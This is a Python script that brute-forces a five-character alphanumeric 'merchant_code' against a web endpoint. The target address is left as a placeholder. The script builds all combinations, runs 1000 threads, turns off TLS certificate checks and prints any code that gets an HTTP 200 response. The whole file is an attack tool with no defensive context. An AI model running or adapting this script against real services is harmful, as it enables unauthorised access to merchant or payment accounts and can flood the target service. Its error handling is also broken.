import random
import re
import itertools
import requests
from threading import Thread
import numpy as np
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'https': 'http://127.0.0.1:8888'}

def brute_force (passwords):
    # print ("something")
    for password in passwords:
        payload = {"merchant_code": ''.join([str(e) for e in password])}
        r = requests.post('ADRESS HERE', json=payload, verify=False)
        if (r.status_code == 200):
            print (str(password) + " " + str(r.status_code))
        # else:
        #     print ("invalid password:" + str(password))

def split(a, n):
    k, m = divmod(len(a), n)
    return (a[i * k + min(i, m):(i + 1) * k + min(i + 1, m)] for i in range(n))

threads_number = 1000
alphabet = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
passwords = list(itertools.product(alphabet, repeat=5))
# passwords = list(itertools.product(range(10), repeat=5))
passwords_splited = split(passwords, threads_number)
# passwords_splited = np.array_split(np.array(passwords), threads_number)
# print([len(item) for item in passwords_splited])
# print(len(passwords))

try:
    for password_list in passwords_splited:
        t = Thread( target= brute_force, args= [password_list]  )
        t.start()
except(e):
    print ("Error: unable to start thread" + e)